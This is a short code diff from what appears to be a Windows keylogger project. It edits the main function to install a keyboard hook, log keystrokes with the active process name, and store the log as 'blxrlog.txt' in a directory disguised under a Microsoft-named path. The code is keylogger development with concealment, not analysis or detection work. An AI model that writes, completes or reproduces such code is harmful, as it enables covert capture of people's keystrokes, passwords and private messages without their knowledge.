@@ -2,6 +2,8 @@
 #include "keyhook.h"
 #include "screen.h"
 
+#define LOG_FILE_NAME "blxrlog.txt"
+
 #define DEBUG_BUILD
 
 #ifdef DEBUG_BUILD
@@ -9,10 +11,13 @@
 #endif
 
 int main() {
+#ifdef DEBUG_BUILD
   DEB(stream::GetPath())
+  stream::MakeDir(stream::GetPath("\\Microsoft\\blxr"));
+  stream::WriteLog("", key_hook::active_process, true);
+#endif
 
 #ifndef DEBUG_BUILD
-  stream::MakeDir(stream::GetPath("\\Microsoft\\blxr"));
   key_hook::InstallHook();
 
   stream::WriteLog("[*] BOOT [*]", key_hook::active_process, true);
